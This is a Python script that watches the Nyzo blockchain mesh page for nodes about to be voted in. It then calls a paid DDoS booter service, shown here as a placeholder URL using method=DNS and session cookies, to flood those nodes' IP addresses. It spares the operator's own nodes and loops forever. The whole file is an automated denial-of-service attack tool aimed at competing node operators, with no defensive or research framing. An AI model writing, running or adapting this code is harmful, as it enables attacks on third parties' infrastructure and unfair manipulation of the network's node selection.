import requests
from time import sleep
from datetime import datetime
from functools import reduce

times = [6]


def ddos_start(ip, avg):
    import requests
    from time import sleep

    cookies = {
        'PHPSESSID': '',
        'username': ''
    }

    get_url = 'https://url.com/?ip=' + ip + '&port=9444&time=' +\
              avg + '&method=DNS'

    req = requests.get(get_url, cookies=cookies)
    sleep(1.0)
    req2 = requests.get(get_url, cookies=cookies)
    sleep(1.0)
    req3 = requests.get(get_url, cookies=cookies)

    print(req.status_code)
    print(req2.status_code)
    print(req3.status_code)


def average(lst):
    return reduce(lambda a, b: a + b, lst) / len(lst)


def me():
    now = datetime.now()
    time_start = datetime.timestamp(now)
    sleep(2)
    mesh_url = 'http://nyzo.co/mesh'
    vote_source = ''

    request_url = requests.get(mesh_url)
    request_url2 = requests.get(vote_source)
    page_decoded = request_url.content.decode('utf-8')
    page_decoded2 = request_url2.content.decode('utf-8')

    in_x_blocks_end = 'blocks)</h3></div></div><div id="meshSection1">'
    in_x_blocks_end_position = page_decoded.find(in_x_blocks_end)
    in_x_blocks_start_position = in_x_blocks_end_position - 40
    in_x_blocks_blob = str(page_decoded[in_x_blocks_start_position:in_x_blocks_end_position])
    in_x_blocks_blob_list = in_x_blocks_blob.split()
    new_node_in_blocks = int(in_x_blocks_blob_list[-1])
    last_ip = 'None'
    allow_attack = True
    if new_node_in_blocks < 25:
        with open('last.txt', 'r') as file:
            for line in file:
                last_ip = line.rstrip()
                if line.rstrip() in page_decoded2:
                    print('We are already attacking this node!')
                    # allow_attack = False
                with open('myips.txt', 'r') as file2:
                    for line2 in file2:
                        if page_decoded2 in line2.rstrip():
                            print('One of my nodes, not attacking!')
                            allow_attack = False
    else:
        print('An attack is not necessary yet')
        allow_attack = False

    print('Found "' + last_ip + '" in file and "' + page_decoded2 + '" being voted for')
    if allow_attack is True:
        with open('last.txt', 'w') as file3:
            print('Attacking "' + page_decoded2 + '"')
            file3.write(page_decoded2)
            avg = str(int(average(times)))
            ddos_start(page_decoded2, avg)

    print(str(int(average(times))))
    now = datetime.now()
    time_end = datetime.timestamp(now)
    time_total = time_end - time_start
    if len(times) < 4:
        times.append(int(time_total))
    elif len(times) >= 4:
        times.pop(0)
        times.append(int(time_total))

    print('Restarting - completed in: ' + str(int(time_total)) + ' seconds')
    me()


me()
